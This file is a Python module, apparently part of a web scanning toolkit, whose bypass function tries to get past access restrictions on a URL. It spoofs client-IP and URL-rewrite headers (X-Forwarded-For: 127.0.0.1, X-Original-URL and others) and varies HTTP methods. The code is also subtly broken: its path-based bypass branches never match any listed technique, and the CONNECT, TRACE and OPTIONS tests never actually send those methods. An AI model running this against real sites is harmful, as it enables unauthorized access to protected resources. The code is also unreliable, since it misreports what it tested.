from ..core.client import fetch
from urllib.parse import urlparse

TECHNIQUES = [
    ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Forwarded-For: localhost", {"X-Forwarded-For": "localhost"}),
    ("X-Forwarded-Host: localhost", {"X-Forwarded-Host": "localhost"}),
    ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
    ("X-Originating-IP: 127.0.0.1", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Remote-IP: 127.0.0.1", {"X-Remote-IP": "127.0.0.1"}),
    ("X-Client-IP: 127.0.0.1", {"X-Client-IP": "127.0.0.1"}),
    ("X-Remote-Addr: 127.0.0.1", {"X-Remote-Addr": "127.0.0.1"}),
    ("X-Original-URL: /", {"X-Original-URL": "/"}),
    ("X-Override-URL: /", {"X-Override-URL": "/"}),
    ("X-Rewrite-URL: /", {"X-Rewrite-URL": "/"}),
    ("Host: localhost", {"Host": "localhost"}),
    ("X-HTTP-Method-Override: GET", {"X-HTTP-Method-Override": "GET"}),
    ("Base-URL: /", {"Base-URL": "/"}),
    ("X-Forwarded-Scheme: http", {"X-Forwarded-Scheme": "http"}),
    ("CLIENT-IP: 127.0.0.1", {"CLIENT-IP": "127.0.0.1"}),
    ("CONNECT method", None, "CONNECT"),
    ("TRACE method", None, "TRACE"),
    ("OPTIONS method", None, "OPTIONS"),
    ("PUT method", None, "PUT"),
]


def bypass(url):
    results = {}
    base = url.rstrip("/")

    for technique in TECHNIQUES:
        name = technique[0]
        headers = technique[1] if len(technique) > 1 and technique[1] else {}
        method = technique[2] if len(technique) > 2 else None
        try:
            if method:
                target = base
                if method == "PUT":
                    s, h, b = fetch(target, headers={"X-HTTP-Method-Override": "PUT", "Content-Type": "text/plain"})
                else:
                    s, h, b = fetch(target)
            else:
                # Path-based bypasses
                if name == "%2e path bypass":
                    target = base + "%2e/"
                elif name == "//path bypass":
                    parsed = urlparse(base)
                    target = f"{parsed.scheme}://{parsed.netloc}//{parsed.path.lstrip('/')}"
                elif name == "/./path bypass":
                    target = base + "/./"
                elif name == ".json bypass":
                    target = base + ".json"
                elif name == "trailing / bypass":
                    target = base + "/" if not base.endswith("/") else base
                elif name == "uppercase bypass":
                    parts = base.rsplit("/", 1)
                    target = parts[0] + "/" + parts[1].upper() if len(parts) > 1 else base.upper()
                else:
                    target = base
                s, h, b = fetch(target, headers=headers)
            results[name] = s
        except Exception as e:
            results[name] = str(e)[:30]

    return results
